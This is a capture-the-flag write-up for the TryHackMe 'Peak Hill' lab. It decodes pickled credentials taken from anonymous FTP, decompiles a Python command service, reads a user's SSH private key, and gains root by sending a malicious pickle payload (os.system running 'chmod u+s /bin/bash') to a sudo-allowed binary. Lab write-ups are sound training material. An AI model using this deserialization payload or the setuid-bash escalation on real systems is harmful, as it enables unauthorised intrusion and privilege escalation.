---
tags:
  - THM
  - Linux
  - Medium
  - Leakage
  - Scripting
  - Deserialization
  - Security-SW
  - Sudo
---
https://tryhackme.com/room/peakhill/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.157.98 peakhill.thm
```
# Scanning
```console
$ nmap -p21,22,7321 -sV -sC peakhill.thm

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.186.238
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open  swx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     Username: Password:
|   NULL: 
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7321-TCP:V=7.98%I=7%D=12/28%Time=69519C37%P=x86_64-pc-linux-gnu%r(N
SF:ULL,A,"Username:\x20")%r(GenericLines,14,"Username:\x20Password:\x20")%
SF:r(GetRequest,14,"Username:\x20Password:\x20")%r(HTTPOptions,14,"Usernam
SF:e:\x20Password:\x20")%r(RTSPRequest,14,"Username:\x20Password:\x20")%r(
SF:RPCCheck,14,"Username:\x20Password:\x20")%r(DNSVersionBindReqTCP,14,"Us
SF:ername:\x20Password:\x20")%r(DNSStatusRequestTCP,14,"Username:\x20Passw
SF:ord:\x20")%r(Help,14,"Username:\x20Password:\x20")%r(SSLSessionReq,14,"
SF:Username:\x20Password:\x20")%r(TerminalServerCookie,14,"Username:\x20Pa
SF:ssword:\x20")%r(TLSSessionReq,14,"Username:\x20Password:\x20")%r(Kerber
SF:os,14,"Username:\x20Password:\x20")%r(SMBProgNeg,14,"Username:\x20Passw
SF:ord:\x20")%r(X11Probe,14,"Username:\x20Password:\x20")%r(FourOhFourRequ
SF:est,14,"Username:\x20Password:\x20")%r(LPDString,14,"Username:\x20Passw
SF:ord:\x20")%r(LDAPSearchReq,14,"Username:\x20Password:\x20")%r(LDAPBindR
SF:eq,14,"Username:\x20Password:\x20")%r(SIPOptions,14,"Username:\x20Passw
SF:ord:\x20")%r(LANDesk-RC,14,"Username:\x20Password:\x20")%r(TerminalServ
SF:er,14,"Username:\x20Password:\x20")%r(NCP,14,"Username:\x20Password:\x2
SF:0")%r(NotesRPC,14,"Username:\x20Password:\x20")%r(JavaRMI,14,"Username:
SF:\x20Password:\x20")%r(WMSRequest,14,"Username:\x20Password:\x20")%r(ora
SF:cle-tns,14,"Username:\x20Password:\x20")%r(ms-sql-s,14,"Username:\x20Pa
SF:ssword:\x20")%r(afp,14,"Username:\x20Password:\x20")%r(giop,14,"Usernam
SF:e:\x20Password:\x20");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# FTP Files
Download all files inside FTP:
```console
$ ftp peakhill.thm
Name: anonymous
Password:

ftp> ls -la
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 .
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 ..
-rw-r--r--    1 ftp      ftp          7048 May 15  2020 .creds
-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt

ftp> mget .creds test.txt
mget .creds? y
mget test.txt? y

ftp> quit
```
The `test.txt` file is irrelevant. However, the `.creds` file contains plain text with ones and zeros, so we rename it as `creds.bin`:
```console
$ cat test.txt
vsftpd test file

$ cat .creds
1000000000000011 ...

$ mv .creds creds.bin
```
# SSH Access
Perhaps, they are some **credentials** stored inside the `creds.bin` file:
```console
$ nc peakhill.thm 7321

Username: anonymous
Password: anonymous
Wrong credentials!
```
Create a `creds.py` file to read the content:
```python
#!/usr/bin/python3

with open('creds.bin', 'r') as f:
    bits = f.read().strip().replace('\n', '')

raw_bytes = bytearray()
for i in range(0, len(bits), 8):
    raw_bytes.append(int(bits[i:i+8], 2))

print(raw_bytes)
```
```console
$ python3 creds.py

bytearray(b'\x80\x03]q\x00(X\n\x00\x00\x00ssh_pass15q\x01X\x01\x00\x00\x00uq\x02\x86q\x03X\t\x00\x00\x00ssh_user1q\x04X\x01\x00\x00\x00hq\x05\x86q\x06X\n\x00\x00\x00ssh_pass25q\x07X\x01\x00\x00\x00rq\x08\x86q\tX\n\x00\x00\x00ssh_pass20q\nh\x05\x86q\x0bX\t\x00\x00\x00ssh_pass7q\x0cX\x01\x00\x00\x00_q\r\x86q\x0eX\t\x00\x00\x00ssh_user0q\x0fX\x01\x00\x00\x00gq\x10\x86q\x11X\n\x00\x00\x00ssh_pass26q\x12X\x01\x00\x00\x00lq\x13\x86q\x14X\t\x00\x00\x00ssh_pass5q\x15X\x01\x00\x00\x003q\x16\x86q\x17X\t\x00\x00\x00ssh_pass1q\x18X\x01\x00\x00\x001q\x19\x86q\x1aX\n\x00\x00\x00ssh_pass22q\x1bh\r\x86q\x1cX\n\x00\x00\x00ssh_pass12q\x1dX\x01\x00\x00\x00@q\x1e\x86q\x1fX\t\x00\x00\x00ssh_user2q X\x01\x00\x00\x00eq!\x86q"X\t\x00\x00\x00ssh_user5q#X\x01\x00\x00\x00iq$\x86q%X\n\x00\x00\x00ssh_pass18q&h\r\x86q\'X\n\x00\x00\x00ssh_pass27q(X\x01\x00\x00\x00dq)\x86q*X\t\x00\x00\x00ssh_pass3q+X\x01\x00\x00\x00kq,\x86q-X\n\x00\x00\x00ssh_pass19q.X\x01\x00\x00\x00tq/\x86q0X\t\x00\x00\x00ssh_pass6q1X\x01\x00\x00\x00sq2\x86q3X\t\x00\x00\x00ssh_pass9q4h\x19\x86q5X\n\x00\x00\x00ssh_pass23q6X\x01\x00\x00\x00wq7\x86q8X\n\x00\x00\x00ssh_pass21q9h\x16\x86q:X\t\x00\x00\x00ssh_pass4q;h\x13\x86q<X\n\x00\x00\x00ssh_pass14q=X\x01\x00\x00\x000q>\x86q?X\t\x00\x00\x00ssh_user6q@X\x01\x00\x00\x00nqA\x86qBX\t\x00\x00\x00ssh_pass2qCX\x01\x00\x00\x00cqD\x86qEX\n\x00\x00\x00ssh_pass13qFh\x08\x86qGX\n\x00\x00\x00ssh_pass16qHhA\x86qIX\t\x00\x00\x00ssh_pass8qJh\x1e\x86qKX\n\x00\x00\x00ssh_pass17qLh)\x86qMX\n\x00\x00\x00ssh_pass24qNh>\x86qOX\t\x00\x00\x00ssh_user3qPh\x08\x86qQX\t\x00\x00\x00ssh_user4qRh,\x86qSX\n\x00\x00\x00ssh_pass11qTh\r\x86qUX\t\x00\x00\x00ssh_pass0qVX\x01\x00\x00\x00pqW\x86qXX\n\x00\x00\x00ssh_pass10qYh\x19\x86qZe.')
```
After doing google research about the magic numbers, found that **Python pickle objects** begin with `\x80\x03` or `PROTO 3`. So, we improve the Python script to deserialize and show the data:
```python
#!/usr/bin/python3

import pickle

with open('creds.bin', 'r') as f:
    bits = f.read().strip().replace('\n', '')

raw_bytes = bytearray()
for i in range(0, len(bits), 8):
    raw_bytes.append(int(bits[i:i+8], 2))

obj = pickle.loads(raw_bytes)
print(obj)
```
```console
$ python3 creds.py

[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```
Finally, we get the **credentials**:
```python
#!/usr/bin/python3

import pickle

with open('creds.bin', 'r') as f:
    bits = f.read().strip().replace('\n', '')

raw_bytes = bytearray()
for i in range(0, len(bits), 8):
    raw_bytes.append(int(bits[i:i+8], 2))

obj = pickle.loads(raw_bytes)
user = [' '] * len(obj)
password = [' '] * len(obj)

for position, value in obj:
    if position.startswith("ssh_user"):
        position = int(position.removeprefix("ssh_user"))
        user[position] = value
    elif position.startswith("ssh_pass"):
        position = int(position.removeprefix("ssh_pass"))
        password[position] = value

user = ''.join(user).strip()
password = ''.join(password).strip()

print(user)
print(password)
```
```console
$ python3 creds.py

gherkin
p1ckl3s_@11_@r0und_th3_w0rld
```
# Python Service
Connect as **user gherkin** via SSH:
```console
$ sshpass -p 'p1ckl3s_@11_@r0und_th3_w0rld' ssh gherkin@peakhill.thm
```
There are **many users** in the machine, perhaps we should migrate to a more privileged user:
```console
$ whoami
gherkin

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
gherkin:x:1002:1002::/home/gherkin:/bin/bash
dill:x:1003:1003::/home/dill:/bin/bash
```
There is a very rare file owned by **root** in our own home directory:
```console
$ ls -l /home/gherkin/cmd_service.pyc

-rw-r--r-- 1 root root 2350 May 15  2020 /home/gherkin/cmd_service.pyc
```
After trying to transfer the file, realized that network tools such as `ping` or `wget` are being blocked, probably because of some kind of **firewall** rules:
```console
$ ping -c 1 192.168.186.238

PING 192.168.186.238 (192.168.186.238) 56(84) bytes of data.
ping: sendmsg: Operation not permitted
```
So, we transfer the file via SSH since we know it is working:
```console
$ scp gherkin@peakhill.thm:/home/gherkin/cmd_service.pyc $(pwd)

gherkin@peakhill.thm's password:
```
Using an [online decompiler](https://www.lddgo.net/en/string/pyc-compile-decompile), got the source code for the service running on port 7321:
```python
# Visit https://www.lddgo.net/en/string/pyc-compile-decompile for more information
# Version : Python 3.8

from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *
import getpass
import os
import subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(0x6E337633725F405F64316C6C5F6D306D336E74L)

def Service():
    '''Service'''
    
    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username and password_input == password:
            return True
        return None

    
    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        None.send(b'Successfully logged in!')
        command = self.receive(b'Cmd: ')
        p = subprocess.Popen(command, True, subprocess.PIPE, subprocess.PIPE, **('shell', 'stdout', 'stderr'))
        self.send(p.stdout.read())
        continue

    
    def send(self, string, newline = (True,)):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    
    def receive(self, prompt = (b'> ',)):
        self.send(prompt, False, **('newline',))
        return self.request.recv(4096).strip()


Service = <NODE:27>(Service, 'Service', socketserver.BaseRequestHandler)

def ThreadedService():
    '''ThreadedService'''
    pass

ThreadedService = <NODE:27>(ThreadedService, 'ThreadedService', socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler)

def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(server.serve_forever, **('target',))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    sleep(10)
    continue

if __name__ == '__main__':
    main()
```
As we can see, we need to enter valid credentials to access the RCE Python service. So, we create our own Python script `cmd_service.py` to get them:
```python
# `pip3 install cryptography`
from Crypto.Util.number import bytes_to_long, long_to_bytes

username = long_to_bytes(1684630636)
password = long_to_bytes(0x6E337633725F405F64316C6C5F6D306D336E74)

print(username)
print(password)
```
```console
$ python3 cmd_service.py

b'dill'
b'n3v3r_@_d1ll_m0m3nt'
```
Now, we can access the service:
```console
$ nc peakhill.thm 7321

Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!

Cmd: whoami
dill
```
Since we can not get a reverse shell with conventional commands due to the **firewall restrictions**, we get the SSH private key at `/home/dill/.ssh/id_rsa` and save it locally as `dill_rsa`. Then, we re-connect to the machine and get the **user flag**:
```console
$ chmod 600 dill_rsa

$ ssh -i dill_rsa dill@peakhill.thm

$ cat /home/dill/user.txt
```
# Privilege Escalation
We can execute an uncommon binary as **root** using `sudo`:
```console
$ sudo -l

Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```
We can not write or read it, but we can execute it:
```console
$ ls -l /opt/peak_hill_farm/peak_hill_farm

-rwxr-x--x 1 root root 1218056 May 15  2020 /opt/peak_hill_farm/peak_hill_farm
```
The binary expects base64-encoded data:
```console
$ sudo /opt/peak_hill_farm/peak_hill_farm

Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: abc
failed to decode base64
```
Valid base64 data does not show relevant information:
```console
$ echo -n 'abc' | base64
YWJj

$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: YWJj
this not grow did not grow on the Peak Hill Farm! :(
```
If we input invalid data, we realize that we are facing again another Python application:
```console
$ sudo /opt/peak_hill_farm/peak_hill_farm

Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: SSSS==
Traceback (most recent call last):
  File "peak_hill_farm.py", line 18, in <module>
ValueError: could not convert string to int
[1836] Failed to execute script peak_hill_farm
```
Perhaps we are facing another **Python pickle** application. Following [this article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/), we create a malicious serialized object with this `create.py` script:
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'chmod u+s /bin/bash'
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled))
```
```console
$ python3 create.py

b'gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNjaG1vZCB1K3MgL2Jpbi9iYXNolIWUUpQu'
```
Our code was indeed executed:
```console
$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNjaG1vZCB1K3MgL2Jpbi9iYXNolIWUUpQu
This grew to: 
0

$ /bin/bash -p

# whoami
root
```
We get the **root flag** which has some weird spacing in the name:
```console
$ ls /root/
 root.txt 
 
 $ find /root -name '*txt*' | xargs cat
```